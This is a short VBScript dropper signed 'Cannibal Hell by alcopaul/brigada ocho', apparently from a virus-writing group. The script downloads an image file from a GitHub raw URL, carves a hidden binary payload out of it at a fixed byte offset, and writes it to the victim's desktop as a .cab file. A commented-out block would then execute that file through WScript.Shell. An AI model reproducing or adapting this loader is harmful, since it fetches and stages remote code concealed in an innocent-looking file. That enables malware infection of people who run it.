strFileURL = "https://raw.githubusercontent.com/alcopaul/LETTERS.40/master/gimo.jpg"
strHDLocation = "C:\Users\rubidus\Desktop\periodictable.cab"
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "GET", strFileURL, false
objXMLHTTP.Send()
If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
Set objADOStream1 = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1
objADOStream1.Open
objADOStream1.Type = 1
objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.Position = 89632
objADOStream1.Write objADOStream.Read(4955)
Set objFSO = Createobject("Scripting.FileSystemObject")
If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
Set objFSO = Nothing
objADOStream1.SaveToFile strHDLocation
objADOStream1.Close
objADOStream.Close
Set objADOStream1 = Nothing
Set objADOStream = Nothing
End if
Set objXMLHTTP = Nothing

'Dim WshShell, oExec
'Set WshShell = CreateObject("WScript.Shell")
'Set oExec = WshShell.Exec(strHDLocation)
'Do While oExec.Status = 0
'WScript.Sleep 100
'Loop

'Cannibal Hell
'by alcopaul/brigada ocho
